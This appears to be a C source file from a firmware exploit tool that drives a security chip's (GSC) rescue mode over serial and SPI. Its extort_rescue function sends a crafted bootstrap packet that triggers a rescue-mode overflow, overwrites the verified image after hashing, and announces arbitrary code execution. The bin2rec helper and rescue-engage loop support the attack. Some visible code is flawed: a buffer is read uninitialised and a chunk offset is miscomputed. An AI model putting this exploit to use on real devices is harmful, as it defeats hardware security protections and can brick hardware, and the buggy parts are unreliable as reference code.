/* Copyright 2025 HavenOverflow
 * Use of this code is permissible so long as the appropriate credit
 * is provided. See the LICENSE file for more info.
 */

#include <fcntl.h>
#include <openssl/evp.h>
#include <openssl/sha.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <termios.h>
#include <unistd.h>

#include "args.h"
#include "chip_config.h"
#include "common.h"
#include "header.h"
#include "rescue.h"
#include "shaft.h"
#include "signed_header.h"
#include "transfer.h"

int serialport_read(int fd, char* c)
{
	int n;

	do {
		n = read(fd, c, 1); // Read one char at a time
		fflush(NULL);

		if(n == -1) return -1;
		if(n == 0) continue;
	} while(n <= 0);
	
	return 0;
}

// Write the UART packet to engage rescue mode
int engage_rescue(const char *tty)
{
	int con, len = 0;
	char rxbuf[UART_RX_BUF_SIZE];
	char c = ' ';

	con = open(tty, O_RDWR);

	do {
		write(con, "r", 1);
		fflush(NULL);

		if (serialport_read(con, &c) == -1) continue;
		if (fbool("verbose")) printf("%c",c); // This is just for debugging, logs each character as it comes in
		
		len = strlen(rxbuf);
		rxbuf[len] = c;
		rxbuf[len + 1] = '\0';
		if (strlen(rxbuf) == UART_RX_BUF_SIZE - 1) strcpy(rxbuf, "");
	} while (!strstr(rxbuf, "escue"));

	printf("Info: Rescue Mode engaged successfully.\n");

	close(con);
	return 0;
}

void extort_rescue(const char *tty, int frame)
{
	uint8_t txbuf[1024];
	struct bootstrap_pkt *pkt = (struct bootstrap_pkt *)txbuf;
	transfer_init();

	pkt->frame_num = frame;
	// This will trigger RESCUE_OVERFLOW, overwriting the valid image after hashing is done.
	pkt->flash_offset = CFG_FLASH_HALF;
	SHA256(&pkt->frame_num, sizeof(txbuf) - SHA256_DIGEST_LENGTH, pkt->hash);

	// Finalize the return.
	transfer_write(txbuf, sizeof(txbuf));
	transfer_close();

	printf("\n\n\nExtortion ACE acheived!\n\n\n");
	printf("Listen! Now, you need to write a valid firmware image, otherwise expect a brick!\n");
	printf("The valid image is set up to only run on a cold boot as a backup.\n");
	printf("Tread lightly!!!\n");
}


/** 
 * Convert a chunk of data into a .rec file for fastboot to write to
 * the GSC during SPI rescue.
 * 
 * @param data:  Pointer to the chunk of data to be transferred.
 * @param len:   Size of the input data to be transferred.
 * @param addr:  Offset in the target's flash memory for the sent data
 *               to be stored.
 * @param output: File path to output data on.
 * 
 * @return 1 for failure, 0 for success.
 */
int bin2rec(const void *data, size_t len,
		uint32_t addr, char *output)
{
	uint8_t buf[1024];
	struct bootstrap_pkt *pkt = (struct bootstrap_pkt *)(buf);
	uint32_t chunk_len, offset = 0;
	FILE *fp;

	remove(output); // Delete the file if it already exists.
	fp = fopen(output, "a+");
	if (!fp) {
		fprintf(stderr, "Error: Failed to open output file.\n");
		return 1;
	}

	chunk_len = sizeof(buf) - offsetof(struct bootstrap_pkt, data);
	pkt->frame_num = 0;
	pkt->flash_offset = addr;

	while (true) {
		if (!len)
			break;

		memset(&pkt->data, 0xff, chunk_len);
		memcpy(&pkt->data, data + offset, 
			MIN(chunk_len, len));
		SHA256(&pkt->frame_num, sizeof(buf) - SHA256_DIGEST_LENGTH, &pkt->hash);

		fwrite(buf, sizeof(buf), 1, fp);

		pkt->frame_num++;
		pkt->flash_offset += MIN(chunk_len, len);
		len -= MIN(chunk_len, len);
		offset += MIN(chunk_len, len);
	}

	fclose(fp);
	return 0;
}